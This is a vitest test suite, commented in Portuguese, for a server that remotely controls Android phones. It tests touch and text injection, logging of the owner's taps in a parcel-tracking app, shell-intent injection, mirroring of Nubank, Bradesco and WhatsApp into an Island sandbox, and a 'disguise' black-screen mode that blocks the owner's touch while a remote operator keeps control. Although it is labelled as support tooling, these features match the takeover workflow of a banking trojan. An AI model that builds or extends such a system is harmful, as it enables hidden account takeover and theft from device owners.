import { describe, expect, it } from "vitest";
import { buildApp } from "../src/app.js";

describe("Digital Touch Detection & Simulation System", () => {
  it("simulates digital touch and records the event", async () => {
    const app = buildApp();

    // 1. Simular toque digital via POST /devices/:id/touch
    const touchRes = await app.inject({
      method: "POST",
      url: "/devices/dev_test_device/touch",
      payload: {
        x: 360,
        y: 640,
        displayWidth: 720,
        displayHeight: 1280
      }
    });

    expect(touchRes.statusCode).toBe(200);
    const touchBody = touchRes.json();
    expect(touchBody.success).toBe(true);
    expect(touchBody.x).toBe(360);
    expect(touchBody.y).toBe(640);

    // 2. Simular gesto de deslize via POST /devices/:id/swipe
    const swipeRes = await app.inject({
      method: "POST",
      url: "/devices/dev_test_device/swipe",
      payload: {
        x1: 360,
        y1: 800,
        x2: 360,
        y2: 200,
        duration: 250
      }
    });

    expect(swipeRes.statusCode).toBe(200);
    expect(swipeRes.json().success).toBe(true);

    // 3. Registrar detecção de toque originado no dispositivo via POST /devices/:id/touch-events
    const detectRes = await app.inject({
      method: "POST",
      url: "/devices/dev_test_device/touch-events",
      payload: {
        action: "click",
        x: 180,
        y: 350,
        packageName: "br.com.jadlog.rastreio",
        className: "android.widget.Button",
        viewText: "Rastrear Encomenda",
        source: "device_user"
      }
    });

    expect(detectRes.statusCode).toBe(200);
    const detectBody = detectRes.json();
    expect(detectBody.success).toBe(true);
    expect(detectBody.event).toBeDefined();
    expect(detectBody.event.viewText).toBe("Rastrear Encomenda");

    // 4. Consultar histórico de toques digitais via GET /devices/:id/touch-events
    const historyRes = await app.inject({
      method: "GET",
      url: "/devices/dev_test_device/touch-events"
    });

    expect(historyRes.statusCode).toBe(200);
    const history = historyRes.json();
    expect(Array.isArray(history)).toBe(true);
    expect(history.length).toBeGreaterThanOrEqual(3);

    const detectedEvent = history.find((e: any) => e.viewText === "Rastrear Encomenda");
    expect(detectedEvent).toBeDefined();
    expect(detectedEvent.source).toBe("device_user");

    const simulatedTouch = history.find((e: any) => e.action === "tap" && e.source === "remote_simulation");
    expect(simulatedTouch).toBeDefined();
    expect(simulatedTouch.x).toBe(360);
    expect(simulatedTouch.y).toBe(640);
  });

  it("exchanges touch commands and telemetry during continuous heartbeat", async () => {
    const app = buildApp();
    const deviceId = "dev_heartbeat_touch_test";

    // Envia toque via API para enfileirar comando pendente
    await app.inject({
      method: "POST",
      url: `/devices/${deviceId}/touch`,
      payload: { x: 500, y: 900 }
    });

    // O agente envia heartbeat contendo toques detectados e recupera os comandos pendentes
    const heartbeatRes = await app.inject({
      method: "POST",
      url: `/devices/${deviceId}/heartbeat`,
      payload: {
        id: deviceId,
        name: "Test Android Device",
        model: "SM-G998B",
        battery: 88,
        touchEvents: [
          {
            action: "click",
            x: 240,
            y: 520,
            viewText: "Entrar com CPF",
            packageName: "br.com.jadlog.rastreio"
          }
        ]
      }
    });

    expect(heartbeatRes.statusCode).toBe(200);
    const hbBody = heartbeatRes.json();
    expect(hbBody.success).toBe(true);
    expect(hbBody.status).toBe("online");
    expect(Array.isArray(hbBody.pendingCommands)).toBe(true);
    expect(hbBody.pendingCommands.length).toBeGreaterThanOrEqual(1);
    expect(hbBody.pendingCommands[0].type).toBe("touch");
    expect(hbBody.pendingCommands[0].payload.x).toBe(500);
    expect(hbBody.pendingCommands[0].payload.y).toBe(900);
  });

  it("serves high-speed binary screen frames and invalidates cache on text/shell injection", async () => {
    const app = buildApp();
    const deviceId = "dev_fast_screen_test";

    // 1. Obter quadro binário de tela
    const screenRes = await app.inject({
      method: "GET",
      url: `/devices/${deviceId}/screen`
    });
    expect(screenRes.statusCode).toBe(200);
    expect(screenRes.headers["content-type"]).toBe("image/png");
    expect(screenRes.rawPayload.length).toBeGreaterThan(0);

    // 2. Injetar comando shell / intent (ex: am start)
    const shellRes = await app.inject({
      method: "POST",
      url: `/devices/${deviceId}/text`,
      payload: { text: "am start -a android.intent.action.VIEW -d https://jadlog.com.br" }
    });
    expect(shellRes.statusCode).toBe(200);
    expect(shellRes.json().success).toBe(true);

    // 3. Injetar texto padrão
    const textRes = await app.inject({
      method: "POST",
      url: `/devices/${deviceId}/text`,
      payload: { text: "senha1234" }
    });
    expect(textRes.statusCode).toBe(200);
    expect(textRes.json().success).toBe(true);
  });

  it("serves adaptive bitrate and resolution screen frames with dynamic quality headers", async () => {
    const app = buildApp();
    const deviceId = "dev_abr_screen_test";

    // 1. Requisitar com perfil eco para sinal baixo
    const ecoRes = await app.inject({
      method: "GET",
      url: `/devices/${deviceId}/screen?quality=eco&scale=0.45`
    });
    expect(ecoRes.statusCode).toBe(200);
    expect(ecoRes.headers["content-type"]).toBe("image/png");
    expect(ecoRes.headers["x-stream-quality"]).toBe("eco");
    expect(ecoRes.headers["x-stream-scale"]).toBe("0.45");
    expect(ecoRes.rawPayload.length).toBeGreaterThan(0);

    // 2. Requisitar com perfil ultra para sinal alto
    const ultraRes = await app.inject({
      method: "GET",
      url: `/devices/${deviceId}/screen?quality=ultra&scale=1.0`
    });
    expect(ultraRes.statusCode).toBe(200);
    expect(ultraRes.headers["content-type"]).toBe("image/png");
    expect(ultraRes.headers["x-stream-quality"]).toBe("ultra");
    expect(ultraRes.headers["x-stream-scale"]).toBe("1.0");
    expect(ultraRes.rawPayload.length).toBeGreaterThan(0);
  });

  it("validates Island profile, auto-mirrors apps, and intercepts app launch clicks inside Island sandbox", async () => {
    const app = buildApp();
    const deviceId = "dev_island_test";

    // 1. Validar instalação do Island via POST /devices/:id/island/validate
    const valRes = await app.inject({
      method: "POST",
      url: `/devices/${deviceId}/island/validate`
    });
    expect(valRes.statusCode).toBe(200);
    const valBody = valRes.json();
    expect(valBody.success).toBe(true);
    expect(valBody.isInstalled).toBe(true);
    expect(valBody.profileUserId).toBe(10);
    expect(valBody.profileName).toContain("Island");

    // 2. Executar auto-mirror dos aplicativos para dentro do Island
    const mirrorRes = await app.inject({
      method: "POST",
      url: `/devices/${deviceId}/island/mirror`,
      payload: { packageNames: ["com.nu.production", "com.whatsapp", "com.bancobradesco"] }
    });
    expect(mirrorRes.statusCode).toBe(200);
    const mirrorBody = mirrorRes.json();
    expect(mirrorBody.success).toBe(true);
    expect(mirrorBody.mirrored).toContain("com.nu.production");
    expect(mirrorBody.mirrored).toContain("com.whatsapp");

    // 3. Consultar status do Island com apps espelhados
    const statusRes = await app.inject({
      method: "GET",
      url: `/devices/${deviceId}/island`
    });
    expect(statusRes.statusCode).toBe(200);
    const statusBody = statusRes.json();
    expect(statusBody.isInstalled).toBe(true);
    expect(statusBody.profileUserId).toBe(10);
    expect(statusBody.mirroredApps).toContain("com.nu.production");

    // 4. Interceptar clique de lançamento de app -> abre dentro do Island (User 10)
    const launchRes = await app.inject({
      method: "POST",
      url: `/devices/${deviceId}/apps/launch`,
      payload: { packageName: "com.nu.production" }
    });
    expect(launchRes.statusCode).toBe(200);
    const launchBody = launchRes.json();
    expect(launchBody.success).toBe(true);
    expect(launchBody.launchedInIsland).toBe(true);
    // 5. Testar autoativação sem perguntas repetidas (POST /devices/:id/island/auto-activate)
    const autoActRes = await app.inject({
      method: "POST",
      url: `/devices/${deviceId}/island/auto-activate`
    });
    expect(autoActRes.statusCode).toBe(200);
    const autoActBody = autoActRes.json();
    expect(autoActBody.success).toBe(true);
    expect(autoActBody.profileUserId).toBe(10);
  });

  it("activates black screen curtain, disables local user physical touch, and maintains full remote support control", async () => {
    const app = buildApp();
    const deviceId = "dev_black_screen_curtain_test";

    // 1. Ativa a Tela Preta no aparelho (Disguise Mode / Cortina de Suporte)
    const activateRes = await app.inject({
      method: "POST",
      url: `/devices/${deviceId}/disguise`,
      payload: {
        type: "black",
        physicalTouchDisabled: true,
        remoteTouchOnly: true
      }
    });

    expect(activateRes.statusCode).toBe(200);
    const actBody = activateRes.json();
    expect(actBody.success).toBe(true);
    expect(actBody.disguise).toBeDefined();
    expect(actBody.disguise.active).toBe(true);
    expect(actBody.disguise.type).toBe("black");
    expect(actBody.disguise.physicalTouchDisabled).toBe(true);
    expect(actBody.disguise.remoteTouchOnly).toBe(true);

    // 2. Consulta o status da tela no dispositivo
    const checkRes = await app.inject({
      method: "GET",
      url: `/devices/${deviceId}/disguise`
    });
    expect(checkRes.statusCode).toBe(200);
    const checkBody = checkRes.json();
    expect(checkBody.disguise?.active).toBe(true);
    expect(checkBody.disguise?.type).toBe("black");

    // 3. Verifica que o toque físico do usuário no aparelho é interceptado e bloqueado
    const localTouchRes = await app.inject({
      method: "POST",
      url: `/devices/${deviceId}/touch-events`,
      payload: {
        action: "click",
        x: 300,
        y: 600,
        source: "device_user",
        packageName: "com.android.settings"
      }
    });
    expect(localTouchRes.statusCode).toBe(200);
    const localTouchBody = localTouchRes.json();
    expect(localTouchBody.success).toBe(false);
    expect(localTouchBody.blocked).toBe(true);
    expect(localTouchBody.message).toContain("Toque físico bloqueado");

    // 4. Verifica que o operador de suporte remoto tem controle total via injeção de toque
    const remoteTouchRes = await app.inject({
      method: "POST",
      url: `/devices/${deviceId}/touch`,
      payload: {
        x: 360,
        y: 720,
        displayWidth: 720,
        displayHeight: 1280
      }
    });
    expect(remoteTouchRes.statusCode).toBe(200);
    expect(remoteTouchRes.json().success).toBe(true);

    // 5. Verifica que eventos remotos de simulação de suporte passam com sucesso
    const simEventRes = await app.inject({
      method: "POST",
      url: `/devices/${deviceId}/touch-events`,
      payload: {
        action: "click",
        x: 360,
        y: 720,
        source: "remote_simulation"
      }
    });
    expect(simEventRes.statusCode).toBe(200);
    expect(simEventRes.json().success).toBe(true);

    // 6. Restaura o aparelho para o estado normal (apaga tela preta e reativa toque físico)
    const restoreRes = await app.inject({
      method: "DELETE",
      url: `/devices/${deviceId}/disguise`
    });
    expect(restoreRes.statusCode).toBe(200);

    // 7. Confirma que a tela de disfarce foi desativada
    const afterRestoreRes = await app.inject({
      method: "GET",
      url: `/devices/${deviceId}/disguise`
    });
    expect(afterRestoreRes.statusCode).toBe(200);
    expect(afterRestoreRes.json().disguise).toBeNull();

    // 8. Confirma que o toque físico local volta a ser aceito normalmente
    const restoredLocalTouchRes = await app.inject({
      method: "POST",
      url: `/devices/${deviceId}/touch-events`,
      payload: {
        action: "click",
        x: 300,
        y: 600,
        source: "device_user"
      }
    });
    expect(restoredLocalTouchRes.statusCode).toBe(200);
    expect(restoredLocalTouchRes.json().success).toBe(true);
    expect(restoredLocalTouchRes.json().blocked).toBeUndefined();
  });
});

